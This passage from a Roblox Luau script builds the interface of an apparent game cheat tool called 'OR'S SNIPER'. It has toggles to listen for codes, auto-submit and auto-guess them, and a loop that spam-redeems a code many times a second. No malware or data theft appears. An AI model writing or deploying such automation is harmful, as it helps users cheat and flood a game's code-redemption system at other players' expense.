        bar.ZIndex = 6
        bar.Parent = btn
        addCorner(bar, 1)

        local entry = { btn = btn, stroke = stroke, bar = bar, gradient = gradient, active = false }
        table.insert(_tabEntries, entry)

        local hoverInfo = TweenInfo.new(0.15, Enum.EasingStyle.Quad)
        btn.MouseEnter:Connect(function()
            if entry.active then return end
            TweenService:Create(btn, hoverInfo, { BackgroundTransparency = 0.1, TextColor3 = COLORS.Text }):Play()
            TweenService:Create(stroke, hoverInfo, { Transparency = 0.35 }):Play()
        end)
        btn.MouseLeave:Connect(function()
            if entry.active then return end
            TweenService:Create(btn, hoverInfo, { BackgroundTransparency = 0.25, TextColor3 = COLORS.Dim }):Play()
            TweenService:Create(stroke, hoverInfo, { Transparency = 0.6 }):Play()
        end)
        return btn, stroke
    end

    local MainTabBtn, MainTabStroke = makeTabButton("Main", 0)
    local SettingsTabBtn, SettingsTabStroke = makeTabButton("Settings", 0.33)
    local AAHelperTabBtn, AAHelperTabStroke = makeTabButton("AA Helper", 0.66)

    local function setActiveTab(activeBtn)
        local info = TweenInfo.new(0.18, Enum.EasingStyle.Quad)
        for _, e in ipairs(_tabEntries) do
            local on = (e.btn == activeBtn)
            e.active = on
            e.gradient.Color = on and TAB_GRADIENT_ACTIVE or TAB_GRADIENT_IDLE
            TweenService:Create(e.btn, info, {
                BackgroundTransparency = on and 0.05 or 0.25,
                TextColor3 = on and COLORS.White or COLORS.Dim,
            }):Play()
            TweenService:Create(e.stroke, info, {
                Transparency = on and 0.05 or 0.6,
                Color = on and TAB_ACCENT or COLORS.Border,
            }):Play()
            TweenService:Create(e.bar, info, {
                Size = on and UDim2.new(0.6, 0, 0, 2) or UDim2.new(0, 0, 0, 2),
            }):Play()
        end
    end

    local PAGE_TOP = 100
    local PAGE_HEIGHT = WINDOW_HEIGHT - PAGE_TOP

    local MainPage = Instance.new("Frame")
    MainPage.Name = "MainPage"
    MainPage.Size = UDim2.new(1, 0, 0, PAGE_HEIGHT)
    MainPage.Position = UDim2.fromOffset(0, PAGE_TOP)
    MainPage.BackgroundTransparency = 1
    MainPage.Visible = true
    MainPage.ZIndex = 3
    MainPage.ClipsDescendants = true
    MainPage.Parent = Window

    local MainStatusLabel = makeLabel(MainPage, "MainStatus", '<font color="rgb(0,220,80)">' .. BULLET .. '</font> Ready', UDim2.new(1, -28, 0, 15), UDim2.fromOffset(12, 0), 12, COLORS.Grey, FONT_BOLD)
    MainStatusLabel.RichText = true
    MainStatusLabel.ZIndex = 4

    updateMainStatus = function()
        if not MainStatusLabel or not MainStatusLabel.Parent then return end
        if _enabled then
            MainStatusLabel.Text = '<font color="rgb(0,220,80)">' .. BULLET .. '</font> Ready'
        else
            MainStatusLabel.Text = '<font color="rgb(230,60,60)">' .. BULLET .. '</font> Off'
        end
    end

    makeLabel(MainPage, "CodesLabel", "Code", UDim2.new(1, -20, 0, 13), UDim2.fromOffset(12, 17), 11, COLORS.Grey, FONT_BOLD).ZIndex = 4

    Console = Instance.new("ScrollingFrame")
    Console.Name = "Console"
    Console.Size = UDim2.new(1, -20, 0, 36)
    Console.Position = UDim2.fromOffset(10, 32)
    Console.BackgroundColor3 = COLORS.Log
    Console.BackgroundTransparency = 0.18
    Console.BorderSizePixel = 0
    Console.ClipsDescendants = true
    Console.Active = true
    Console.ScrollingEnabled = true
    Console.ScrollingDirection = Enum.ScrollingDirection.Y
    Console.CanvasSize = UDim2.new(0, 0, 0, 0)
    Console.ScrollBarThickness = 4
    Console.ZIndex = 3
    Console.Parent = MainPage
    addCorner(Console, 10)
    addStroke(Console, COLORS.Border, 1, 0.55)

    ConsoleOutput = Instance.new("TextLabel")
    ConsoleOutput.Name = "ConsoleOutput"
    ConsoleOutput.Size = UDim2.new(1, -18, 0, 15)
    ConsoleOutput.AutomaticSize = Enum.AutomaticSize.Y
    ConsoleOutput.Position = UDim2.fromOffset(9, 4)
    ConsoleOutput.BackgroundTransparency = 1
    ConsoleOutput.RichText = true
    ConsoleOutput.Text = ""
    ConsoleOutput.TextSize = 12
    ConsoleOutput.Font = FONT_MEDIUM
    ConsoleOutput.TextColor3 = COLORS.Text
    ConsoleOutput.TextXAlignment = Enum.TextXAlignment.Left
    ConsoleOutput.TextYAlignment = Enum.TextYAlignment.Top
    ConsoleOutput.TextWrapped = false
    ConsoleOutput.ZIndex = 4
    ConsoleOutput.Parent = Console
    addTextStroke(ConsoleOutput, 1, TEXT_STROKE_TRANS)

    local CONSOLE_BOTTOM_PADDING = 18
    updateConsoleCanvas = function()
        if not Console or not ConsoleOutput then return end
        Console.CanvasSize = UDim2.new(0, 0, 0, ConsoleOutput.Position.Y.Offset + ConsoleOutput.AbsoluteSize.Y + CONSOLE_BOTTOM_PADDING)
    end
    ConsoleOutput:GetPropertyChangedSignal("AbsoluteSize"):Connect(updateConsoleCanvas)
    task.defer(updateConsoleCanvas)

    local function flashButtonGray(button)
        local originalColor = button.BackgroundColor3
        local originalTrans = button.BackgroundTransparency
        button.BackgroundColor3 = Color3.new(
            math.min(1, originalColor.R * 0.6 + 0.5),
            math.min(1, originalColor.G * 0.6 + 0.5),
            math.min(1, originalColor.B * 0.6 + 0.5)
        )
        button.BackgroundTransparency = math.max(0.05, originalTrans - 0.25)
        task.delay(0.15, function()
            if button and button.Parent then
                button.BackgroundColor3 = originalColor
                button.BackgroundTransparency = originalTrans
            end
        end)
    end

    local ButtonFrame = Instance.new("Frame")
    ButtonFrame.Name = "ButtonFrame"
    ButtonFrame.Size = UDim2.new(1, -20, 0, 26)
    ButtonFrame.Position = UDim2.fromOffset(10, 72)
    ButtonFrame.BackgroundTransparency = 1
    ButtonFrame.ZIndex = 4
    ButtonFrame.Parent = MainPage

    local btnGap = 5

    local ClearLogsBtn = Instance.new("TextButton")
    ClearLogsBtn.Size = UDim2.new(0.5, -btnGap / 2, 1, 0)
    ClearLogsBtn.Position = UDim2.fromOffset(0, 0)
    ClearLogsBtn.BackgroundColor3 = Color3.fromRGB(58, 60, 66)
    ClearLogsBtn.BackgroundTransparency = 0.15
    ClearLogsBtn.Text = "Clear"
    ClearLogsBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    ClearLogsBtn.ZIndex = 5
    ClearLogsBtn.Parent = ButtonFrame
    styleButton(ClearLogsBtn, 13)
    addStroke(ClearLogsBtn, Color3.fromRGB(125, 129, 138), 1, 0.3)
    ClearLogsBtn.Activated:Connect(function()
        flashButtonGray(ClearLogsBtn)
        ConsoleOutput.Text = ""
        task.defer(updateConsoleCanvas)
    end)

    local RedeemBtn = Instance.new("TextButton")
    RedeemBtn.Size = UDim2.new(0.5, -btnGap / 2, 1, 0)
    RedeemBtn.Position = UDim2.new(0.5, btnGap / 2, 0, 0)
    RedeemBtn.BackgroundColor3 = Color3.fromRGB(82, 86, 94)
    RedeemBtn.BackgroundTransparency = 0.15
    RedeemBtn.Text = "Redeem"
    RedeemBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    RedeemBtn.ZIndex = 5
    RedeemBtn.Parent = ButtonFrame
    styleButton(RedeemBtn, 13)
    addStroke(RedeemBtn, Color3.fromRGB(155, 160, 170), 1, 0.3)
    RedeemBtn.Activated:Connect(function()
        flashButtonGray(RedeemBtn)
        if AAX.redeeming then
            AAX.redeeming = false
            RedeemBtn.Text = "Redeem"
            setStatus("Redeem stopped")
            return
        end
        local box = weeklyCodeBox()
        local code = (box and box.Text ~= "" and box.Text) or (_lastNonBlankBoxText ~= "" and _lastNonBlankBoxText) or nil
        if not code then
            setStatus("No code to redeem")
            return
        end
        AAX.redeeming = true
        RedeemBtn.Text = "Stop"
        task.spawn(function()
            local n = 0
            while AAX.redeeming and RedeemBtn.Parent do
                n = n + 1
                typeAndSubmitCode(code)
                setStatus("Redeeming (" .. code .. ") x" .. n)
                task.wait(0.05)
            end
            AAX.redeeming = false
            if RedeemBtn.Parent then RedeemBtn.Text = "Redeem" end
        end)
    end)

    do
        local function attachTag(char)
            local head = char:WaitForChild("Head", 10)
            if not head then return end
            local old = head:FindFirstChild("CZUserTag")
            if old then old:Destroy() end
            local bb = Instance.new("BillboardGui")
            bb.Name = "CZUserTag"
            bb.Adornee = head
            bb.Size = UDim2.fromOffset(90, 22)
            bb.StudsOffset = Vector3.new(0, 2.4, 0)
            bb.AlwaysOnTop = true
            bb.ResetOnSpawn = false
            bb.Parent = head
            local box = Instance.new("Frame")
            box.Size = UDim2.new(1, 0, 1, 0)
            box.BackgroundColor3 = COLORS.Window
            box.BackgroundTransparency = 0.3
            box.BorderSizePixel = 0
            box.Parent = bb
            addCorner(box, 8)
            addStroke(box, COLORS.Border, 1, 0.35)
            local lbl = Instance.new("TextLabel")
            lbl.Size = UDim2.new(1, 0, 1, 0)
            lbl.BackgroundTransparency = 1
            lbl.Text = "OR'S SNIPER"
            lbl.TextSize = 13
            lbl.TextColor3 = COLORS.White
            lbl.Font = FONT_BOLD
            lbl.Parent = box
            addTextStroke(lbl, 1, TEXT_STROKE_TRANS)
        end
        if player.Character then task.spawn(attachTag, player.Character) end
        AAX.tagConn = player.CharacterAdded:Connect(attachTag)
    end

    local MainSection = Instance.new("Frame")
    MainSection.Name = "MainSection"
    MainSection.Size = UDim2.new(1, -20, 0, 112)
    MainSection.Position = UDim2.fromOffset(10, 102)
    MainSection.BackgroundColor3 = COLORS.Section
    MainSection.BackgroundTransparency = 0.24
    MainSection.BorderSizePixel = 0
    MainSection.ZIndex = 3
    MainSection.Parent = MainPage
    addCorner(MainSection, 10)
    addStroke(MainSection, Color3.fromRGB(115, 118, 126), 1, 0.55)

    makeLabel(MainSection, "SectionTitle", "Main", UDim2.new(1, -12, 0, 14), UDim2.fromOffset(10, 2), 11, COLORS.SectionLabel, FONT_BOLD)

    local listenCard = Instance.new("Frame")
    listenCard.Size = UDim2.new(1, -12, 0, 22)
    listenCard.Position = UDim2.fromOffset(6, 18)
    listenCard.BackgroundTransparency = 1
    listenCard.Parent = MainSection
    makeLabel(listenCard, "Title", "Listen", UDim2.fromOffset(130, 22), UDim2.fromOffset(8, 0), 12, COLORS.White, FONT_BOLD)
    listenBtn = Instance.new("TextButton")
    listenBtn.Size = UDim2.fromOffset(46, 20)
    listenBtn.Position = UDim2.new(1, -52, 0.5, -10)
    listenBtn.Text = _enabled and "ON" or "OFF"
    listenBtn.ZIndex = 5
    listenBtn.Parent = listenCard
    styleButton(listenBtn, 11)
    listenStroke = addStroke(listenBtn, COLORS.Border, 1, 0.7)
    applyToggleVisual(listenBtn, listenStroke, _enabled)
    listenBtn.Activated:Connect(function()
        if not canToggle("listen") then return end
        _enabled = not _enabled
        savedConfig.codeSniper = _enabled
        saveConfig()
        listenBtn.Text = _enabled and "ON" or "OFF"
        applyToggleVisual(listenBtn, listenStroke, _enabled)
        updateMainStatus()
    end)

    local autoCard = Instance.new("Frame")
    autoCard.Size = UDim2.new(1, -12, 0, 22)
    autoCard.Position = UDim2.fromOffset(6, 42)
    autoCard.BackgroundTransparency = 1
    autoCard.Parent = MainSection
    makeLabel(autoCard, "Title", "Auto submit", UDim2.fromOffset(130, 22), UDim2.fromOffset(8, 0), 12, COLORS.White, FONT_BOLD)
    autoSubmitBtn = Instance.new("TextButton")
    autoSubmitBtn.Size = UDim2.fromOffset(46, 20)
    autoSubmitBtn.Position = UDim2.new(1, -52, 0.5, -10)
    autoSubmitBtn.Text = _autoAccept and "ON" or "OFF"
    autoSubmitBtn.ZIndex = 5
    autoSubmitBtn.Parent = autoCard
    styleButton(autoSubmitBtn, 11)
    autoSubmitStroke = addStroke(autoSubmitBtn, COLORS.Border, 1, 0.7)
    applyToggleVisual(autoSubmitBtn, autoSubmitStroke, _autoAccept)
    autoSubmitBtn.Activated:Connect(function()
        if not canToggle("autosubmit") then return end
        _autoAccept = not _autoAccept
        savedConfig.autoSubmit = _autoAccept
        saveConfig()
        autoSubmitBtn.Text = _autoAccept and "ON" or "OFF"
        applyToggleVisual(autoSubmitBtn, autoSubmitStroke, _autoAccept)
    end)

    local delayCard = Instance.new("Frame")
    delayCard.Size = UDim2.new(1, -12, 0, 22)
    delayCard.Position = UDim2.fromOffset(6, 90)
    delayCard.BackgroundTransparency = 1
    delayCard.Visible = not _manualModeEnabled
    delayCard.Parent = MainSection
    makeLabel(delayCard, "Title", "Submit after words", UDim2.fromOffset(122, 22), UDim2.fromOffset(8, 0), 11, COLORS.White, FONT_BOLD)

    do
        local submitAfterButtons = {}
        local function refreshSubmitAfter()
            for n, entry in pairs(submitAfterButtons) do
                local on = (n == _submitAfter)
                entry.btn.BackgroundColor3 = on and Color3.fromRGB(145, 149, 158) or COLORS.Control
                entry.btn.BackgroundTransparency = on and 0.1 or 0.35
                entry.btn.TextColor3 = on and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(130, 130, 140)
                entry.stroke.Transparency = on and 0.1 or 0.75
            end
        end
        for n = 1, 4 do
            local numBtn = Instance.new("TextButton")
            numBtn.Name = "SubmitAfter" .. n
            numBtn.Size = UDim2.fromOffset(20, 20)
            numBtn.Position = UDim2.new(1, -95 + (n - 1) * 23, 0.5, -10)
            numBtn.Text = tostring(n)
            numBtn.ZIndex = 5
            numBtn.Parent = delayCard
            styleButton(numBtn, 11)
            local numStroke = addStroke(numBtn, COLORS.Border, 1, 0.75)
            submitAfterButtons[n] = { btn = numBtn, stroke = numStroke }
            numBtn.Activated:Connect(function()
                _submitAfter = n
                savedConfig.submitAfter = n
                clearWeeklyCapture()
                saveConfig()
                refreshSubmitAfter()
            end)
        end
        refreshSubmitAfter()
    end

    local manualMainCard = Instance.new("Frame")
    manualMainCard.Size = UDim2.new(1, -12, 0, 22)
    manualMainCard.Position = UDim2.fromOffset(6, 66)
    manualMainCard.BackgroundTransparency = 1
    manualMainCard.Parent = MainSection
    makeLabel(manualMainCard, "Title", "Auto Guess", UDim2.fromOffset(130, 22), UDim2.fromOffset(8, 0), 12, COLORS.White, FONT_BOLD)
    manualMainBtn = Instance.new("TextButton")
    manualMainBtn.Size = UDim2.fromOffset(46, 20)
    manualMainBtn.Position = UDim2.new(1, -52, 0.5, -10)
    manualMainBtn.Text = _manualModeEnabled and "ON" or "OFF"
    manualMainBtn.ZIndex = 5
    manualMainBtn.Parent = manualMainCard
    styleButton(manualMainBtn, 11)
    manualMainStroke = addStroke(manualMainBtn, COLORS.Border, 1, 0.7)
    applyToggleVisual(manualMainBtn, manualMainStroke, _manualModeEnabled)
    manualMainBtn.Activated:Connect(function()
        if not canToggle("manual") then return end
        _manualModeEnabled = not _manualModeEnabled
        savedConfig.manualMode = _manualModeEnabled
        saveConfig()
        manualMainBtn.Text = _manualModeEnabled and "ON" or "OFF"
        applyToggleVisual(manualMainBtn, manualMainStroke, _manualModeEnabled)
        if not _manualModeEnabled then clearManualBuffer() end
        if delayCard then delayCard.Visible = not _manualModeEnabled end
    end)

    local function setupListenKeybind()
        if _listenInputConnection then _listenInputConnection:Disconnect(); _listenInputConnection = nil end
        _listenInputConnection = UserInputService.InputBegan:Connect(function(inp, gp)
            if gp then return end
            if UserInputService:GetFocusedTextBox() then return end
            if inp.KeyCode == Enum.KeyCode[_listenKeybind] then
                if not canToggle("listen") then return end
                _enabled = not _enabled
                savedConfig.codeSniper = _enabled
                saveConfig()
                listenBtn.Text = _enabled and "ON" or "OFF"
                applyToggleVisual(listenBtn, listenStroke, _enabled)
                updateMainStatus()
            end
        end)
    end

    -- ============ SETTINGS ============
    local SETTINGS_W = 210
    local SETTINGS_H = 216
    local SettingsPopup = Instance.new("Frame")
    SettingsPopup.Name = "SettingsPopup"
    SettingsPopup.Size = UDim2.fromOffset(SETTINGS_W, SETTINGS_H)
    SettingsPopup.AnchorPoint = Vector2.new(0.5, 0.5)
    SettingsPopup.Position = UDim2.new(0.5, 0, 0.5, 0)
    SettingsPopup.BackgroundColor3 = COLORS.Window
    SettingsPopup.BackgroundTransparency = 0.40
    SettingsPopup.BorderSizePixel = 0
    SettingsPopup.Visible = false
    SettingsPopup.Active = true
    SettingsPopup.ZIndex = 50
    SettingsPopup.Parent = GUI
    addCorner(SettingsPopup, 12)
    addStroke(SettingsPopup, COLORS.Border, 1, 0.4)

    local SettingsScale = Instance.new("UIScale")
    SettingsScale.Scale = _guiScale / 100
    SettingsScale.Parent = SettingsPopup
    table.insert(_guiScales, SettingsScale)

    local SettingsBg = Instance.new("ImageLabel")
    SettingsBg.Size = UDim2.new(1, 0, 1, 0)
    SettingsBg.BackgroundTransparency = 1
    SettingsBg.Image = "rbxassetid://105543452376246"
    SettingsBg.ImageColor3 = BG_TINT
    SettingsBg.ScaleType = Enum.ScaleType.Stretch
    SettingsBg.ZIndex = 1
    SettingsBg.Parent = SettingsPopup
    addCorner(SettingsBg, 12)
    table.insert(_bgImages, SettingsBg)

    local settingsOverlay = Instance.new("Frame")
    settingsOverlay.Size = UDim2.new(1, 0, 1, 0)
    settingsOverlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    settingsOverlay.BackgroundTransparency = DARK_OVERLAY_TRANS
    settingsOverlay.BorderSizePixel = 0
    settingsOverlay.ZIndex = 2
    settingsOverlay.Parent = SettingsPopup
    addCorner(settingsOverlay, 12)

    local settingsHeader = Instance.new("Frame")
    settingsHeader.Size = UDim2.new(1, 0, 0, 24)
    settingsHeader.BackgroundTransparency = 1
    settingsHeader.Active = true
    settingsHeader.ZIndex = 51
    settingsHeader.Parent = SettingsPopup
    makeLabel(settingsHeader, "Title", "Settings", UDim2.fromOffset(180, 24), UDim2.fromOffset(10, 0), 12, COLORS.SectionLabel, FONT_TITLE)

    local settingsCloseBtn = Instance.new("TextButton")
    settingsCloseBtn.Size = UDim2.fromOffset(16, 16)
    settingsCloseBtn.Position = UDim2.new(1, -20, 0, 4)
    settingsCloseBtn.BackgroundColor3 = COLORS.Control
    settingsCloseBtn.BackgroundTransparency = 0.35
    settingsCloseBtn.BorderSizePixel = 0
    settingsCloseBtn.AutoButtonColor = false
    settingsCloseBtn.Active = true
    settingsCloseBtn.Text = "X"
    settingsCloseBtn.TextSize = 9
    settingsCloseBtn.TextColor3 = COLORS.White
    settingsCloseBtn.Font = FONT_BOLD
    settingsCloseBtn.ZIndex = 52
    settingsCloseBtn.Parent = settingsHeader
    addCorner(settingsCloseBtn, 4)
    addStroke(settingsCloseBtn, COLORS.Border, 1, 0.5)
    addTextStroke(settingsCloseBtn, 1, TEXT_STROKE_TRANS)

    local ROW_H = 20
    local ROW_GAP = 2

    local function createSettingsRow(y, labelText, initialState, onToggle, cooldownName)
        local row = Instance.new("Frame")
        row.Size = UDim2.new(1, -20, 0, ROW_H)
        row.Position = UDim2.fromOffset(10, y)
        row.BackgroundColor3 = COLORS.Section
        row.BackgroundTransparency = 0.22
        row.ZIndex = 3
        row.Parent = SettingsPopup
        addCorner(row, 5)
        makeLabel(row, "Label", labelText, UDim2.fromOffset(155, ROW_H), UDim2.fromOffset(8, 0), 10, COLORS.White, FONT_BOLD)
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.fromOffset(44, ROW_H - 4)
        btn.Position = UDim2.new(1, -50, 0.5, -(ROW_H - 4) / 2)
        btn.Text = initialState and "ON" or "OFF"
        btn.ZIndex = 55
        btn.Parent = row
        styleButton(btn, 10)
        local stroke = addStroke(btn, COLORS.Border, 1, 0.7)
        applyToggleVisual(btn, stroke, initialState)
        local state = initialState
        btn.Activated:Connect(function()
            if cooldownName and not canToggle(cooldownName) then return end
            state = not state
            if onToggle then onToggle(state) end
            btn.Text = state and "ON" or "OFF"
            applyToggleVisual(btn, stroke, state)
        end)
        return btn
    end

    createSettingsRow(28, "Auto Listen", _autoTurnOnListen, function(ns)
        _autoTurnOnListen = ns; savedConfig.autoTurnOnListen = ns; saveConfig()
    end, "autolisten")

    -- Spam Redeem row (FIXED LAYOUT - label no longer overlaps toggle)
    local spamRow = Instance.new("Frame")
    spamRow.Size = UDim2.new(1, -20, 0, 24)
    spamRow.Position = UDim2.fromOffset(10, 52)
    spamRow.BackgroundColor3 = COLORS.Section
    spamRow.BackgroundTransparency = 0.22
    spamRow.ZIndex = 3
    spamRow.Parent = SettingsPopup
    addCorner(spamRow, 5)

    makeLabel(spamRow, "Label", "Spam Redeem", UDim2.fromOffset(74, 24), UDim2.fromOffset(8, 0), 9, COLORS.White, FONT_BOLD)

    SpamToggle = Instance.new("TextButton")
    SpamToggle.Size = UDim2.fromOffset(38, 18)
    SpamToggle.Position = UDim2.fromOffset(84, 3)
    SpamToggle.Text = _spamRedeem and "ON" or "OFF"
    SpamToggle.ZIndex = 55
    SpamToggle.Parent = spamRow
    styleButton(SpamToggle, 10)
    spamToggleStroke = addStroke(SpamToggle, COLORS.Border, 1, 0.7)
    applyToggleVisual(SpamToggle, spamToggleStroke, _spamRedeem)

    local SpamShell = Instance.new("Frame")
    SpamShell.Size = UDim2.fromOffset(64, 18)
    SpamShell.Position = UDim2.fromOffset(126, 3)
    SpamShell.BackgroundColor3 = COLORS.Control
    SpamShell.BackgroundTransparency = 0.35
    SpamShell.BorderSizePixel = 0
    SpamShell.ZIndex = 55
    SpamShell.Parent = spamRow
    addCorner(SpamShell, 4)
    addStroke(SpamShell, COLORS.Border, 1, 0.55)

    local SpamMinus = Instance.new("TextButton")
    SpamMinus.Size = UDim2.fromOffset(15, 16)
    SpamMinus.Position = UDim2.fromOffset(1, 1)
    SpamMinus.BackgroundColor3 = COLORS.Control
    SpamMinus.BackgroundTransparency = 0.35
    SpamMinus.Text = "-"
    SpamMinus.TextSize = 12
    SpamMinus.TextColor3 = COLORS.PureWhite
    SpamMinus.Font = FONT_BOLD
    SpamMinus.ZIndex = 56
    SpamMinus.Parent = SpamShell
    addCorner(SpamMinus, 3)
    addTextStroke(SpamMinus, 1, TEXT_STROKE_TRANS)

    local SpamBox = Instance.new("TextBox")
    SpamBox.Size = UDim2.fromOffset(30, 16)
    SpamBox.Position = UDim2.fromOffset(17, 1)
    SpamBox.BackgroundTransparency = 1
    SpamBox.Text = tostring(_spamCount)
    SpamBox.TextSize = 10
    SpamBox.TextColor3 = COLORS.White
    SpamBox.Font = FONT_BOLD
    SpamBox.TextXAlignment = Enum.TextXAlignment.Center
    SpamBox.ClearTextOnFocus = false
    SpamBox.ZIndex = 56
    SpamBox.Parent = SpamShell
    addTextStroke(SpamBox, 1, TEXT_STROKE_TRANS)

    local SpamPlus = Instance.new("TextButton")
    SpamPlus.Size = UDim2.fromOffset(15, 16)
    SpamPlus.Position = UDim2.fromOffset(48, 1)
    SpamPlus.BackgroundColor3 = COLORS.Control
    SpamPlus.BackgroundTransparency = 0.35
    SpamPlus.Text = "+"
    SpamPlus.TextSize = 12
    SpamPlus.TextColor3 = COLORS.PureWhite
    SpamPlus.Font = FONT_BOLD
    SpamPlus.ZIndex = 56
    SpamPlus.Parent = SpamShell
    addCorner(SpamPlus, 3)
    addTextStroke(SpamPlus, 1, TEXT_STROKE_TRANS)

    setSpamRedeem = function(state)
        _spamRedeem = state
        savedConfig.spamRedeem = state
        saveConfig()
        if SpamToggle and SpamToggle.Parent then
            SpamToggle.Text = state and "ON" or "OFF"
            applyToggleVisual(SpamToggle, spamToggleStroke, state)
        end
    end

    SpamToggle.Activated:Connect(function()
        if not canToggle("spam") then return end
        setSpamRedeem(not _spamRedeem)
    end)

    local function applySpamCount(newCount)
        newCount = math.clamp(math.floor(newCount), 1, 100)
        _spamCount = newCount
        SpamBox.Text = tostring(newCount)
        savedConfig.spamCount = newCount
        saveConfig()
    end
    SpamMinus.Activated:Connect(function() applySpamCount(_spamCount - 1) end)
    SpamPlus.Activated:Connect(function() applySpamCount(_spamCount + 1) end)
    SpamBox.FocusLost:Connect(function()
        local num = tonumber(SpamBox.Text)
        if not num then num = _spamCount end
        applySpamCount(num)
    end)

    -- Listen Key
    local keyRow = Instance.new("Frame")
    keyRow.Size = UDim2.new(1, -20, 0, ROW_H)
    keyRow.Position = UDim2.fromOffset(10, 80)
    keyRow.BackgroundColor3 = COLORS.Section
    keyRow.BackgroundTransparency = 0.55
    keyRow.ZIndex = 3
    keyRow.Parent = SettingsPopup
    addCorner(keyRow, 5)
    makeLabel(keyRow, "Label", "Listen Key", UDim2.fromOffset(155, ROW_H), UDim2.fromOffset(8, 0), 10, COLORS.White, FONT_BOLD)

    local keyBtn = Instance.new("TextButton")
    keyBtn.Size = UDim2.fromOffset(44, ROW_H - 4)
    keyBtn.Position = UDim2.new(1, -50, 0.5, -(ROW_H - 4) / 2)
    keyBtn.BackgroundColor3 = COLORS.Control
    keyBtn.BackgroundTransparency = 0.35
    keyBtn.Text = _listenKeybind
    keyBtn.TextColor3 = COLORS.White
    keyBtn.ZIndex = 55
    keyBtn.Parent = keyRow
    styleButton(keyBtn, 10)
    addStroke(keyBtn, COLORS.Border, 1, 0.55)
    keyBtn.Activated:Connect(function()
        if _capturingListenKey then return end
        _capturingListenKey = true
        keyBtn.Text = "..."
    end)

    local captureConnection
    captureConnection = UserInputService.InputBegan:Connect(function(inp, gp)
        if not _capturingListenKey then return end
        if gp then return end
        if inp.UserInputType ~= Enum.UserInputType.Keyboard then return end
        local key = inp.KeyCode
        if key == Enum.KeyCode.Unknown then return end
        local keyName = key.Name
        if #keyName == 1 then _listenKeybind = keyName:upper() else _listenKeybind = keyName end
        savedConfig.listenKeybind = _listenKeybind
        saveConfig()
        keyBtn.Text = _listenKeybind
        _capturingListenKey = false
        setupListenKeybind()
        if captureConnection then captureConnection:Disconnect(); captureConnection = nil end
    end)

    do
        local SCALE_MIN, SCALE_MAX, SCALE_STEP = 10, 100, 10
        local SCALE_STEPS = (SCALE_MAX - SCALE_MIN) / SCALE_STEP

        local scaleRow = Instance.new("Frame")
        scaleRow.Size = UDim2.new(1, -20, 0, 34)
        scaleRow.Position = UDim2.fromOffset(10, 104)
        scaleRow.BackgroundColor3 = COLORS.Section
        scaleRow.BackgroundTransparency = 0.55
        scaleRow.ZIndex = 3
        scaleRow.Parent = SettingsPopup
        addCorner(scaleRow, 5)
        makeLabel(scaleRow, "Label", "GUI Scale", UDim2.fromOffset(100, 16), UDim2.fromOffset(8, 2), 10, COLORS.White, FONT_BOLD)
        local scaleValueLabel = makeLabel(scaleRow, "Value", tostring(_guiScale) .. "%", UDim2.fromOffset(50, 16), UDim2.new(1, -58, 0, 2), 10, COLORS.White, FONT_BOLD)
        scaleValueLabel.TextXAlignment = Enum.TextXAlignment.Right

        local scaleTrack = Instance.new("Frame")
        scaleTrack.Name = "ScaleTrack"
        scaleTrack.Size = UDim2.new(1, -24, 0, 6)
        scaleTrack.Position = UDim2.fromOffset(12, 22)
        scaleTrack.BackgroundColor3 = COLORS.Control
        scaleTrack.BackgroundTransparency = 0.2
        scaleTrack.BorderSizePixel = 0
        scaleTrack.ZIndex = 55
        scaleTrack.Parent = scaleRow
        addCorner(scaleTrack, 3)
        addStroke(scaleTrack, COLORS.Border, 1, 0.6)

        local scaleFill = Instance.new("Frame")
        scaleFill.Size = UDim2.new(0, 0, 1, 0)
        scaleFill.BackgroundColor3 = Color3.fromRGB(205, 208, 214)
        scaleFill.BorderSizePixel = 0
        scaleFill.ZIndex = 56
        scaleFill.Parent = scaleTrack
        addCorner(scaleFill, 3)

        local scaleKnob = Instance.new("Frame")
        scaleKnob.AnchorPoint = Vector2.new(0.5, 0.5)
        scaleKnob.Size = UDim2.fromOffset(12, 12)
        scaleKnob.Position = UDim2.new(0, 0, 0.5, 0)
        scaleKnob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        scaleKnob.BorderSizePixel = 0
        scaleKnob.ZIndex = 57
        scaleKnob.Parent = scaleTrack
        addCorner(scaleKnob, 6)
        addStroke(scaleKnob, Color3.fromRGB(205, 208, 214), 1, 0.2)

        local scaleHit = Instance.new("TextButton")
        scaleHit.Name = "ScaleHit"
        scaleHit.Size = UDim2.new(1, 12, 0, 22)
        scaleHit.Position = UDim2.new(0, -6, 0.5, -11)
        scaleHit.BackgroundTransparency = 1
        scaleHit.Text = ""
        scaleHit.AutoButtonColor = false
        scaleHit.Active = true
        scaleHit.ZIndex = 58
        scaleHit.Parent = scaleTrack

        local function refreshScaleSlider()
            local fraction = (_guiScale - SCALE_MIN) / (SCALE_MAX - SCALE_MIN)
            scaleFill.Size = UDim2.new(fraction, 0, 1, 0)
            scaleKnob.Position = UDim2.new(fraction, 0, 0.5, 0)
            scaleValueLabel.Text = tostring(_guiScale) .. "%"
        end
        refreshScaleSlider()

        local scaleDragging = false
        local scaleDragStartX, scaleDragStartPct, scalePxPerStep = 0, _guiScale, 1
        scaleHit.InputBegan:Connect(function(input)
            if input.UserInputType ~= Enum.UserInputType.MouseButton1 and input.UserInputType ~= Enum.UserInputType.Touch then return end
            local trackWidth = math.max(scaleTrack.AbsoluteSize.X, 1)
            local fraction = math.clamp((input.Position.X - scaleTrack.AbsolutePosition.X) / trackWidth, 0, 1)
            scalePxPerStep = trackWidth / SCALE_STEPS
            applyGuiScale(SCALE_MIN + math.floor(fraction * SCALE_STEPS + 0.5) * SCALE_STEP)
            refreshScaleSlider()
            scaleDragging = true
            scaleDragStartX = input.Position.X
            scaleDragStartPct = _guiScale
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then scaleDragging = false end
            end)
        end)
        UserInputService.InputChanged:Connect(function(input)
            if not scaleDragging then return end
            if input.UserInputType ~= Enum.UserInputType.MouseMovement and input.UserInputType ~= Enum.UserInputType.Touch then return end
            local steps = math.floor((input.Position.X - scaleDragStartX) / scalePxPerStep + 0.5)
            local newPct = math.clamp(scaleDragStartPct + steps * SCALE_STEP, SCALE_MIN, SCALE_MAX)
            if newPct ~= _guiScale then
                applyGuiScale(newPct)
                refreshScaleSlider()
            end
        end)

    end

    settingsCloseBtn.Activated:Connect(function()
        SettingsPopup.Visible = false
        setActiveTab(MainTabBtn)
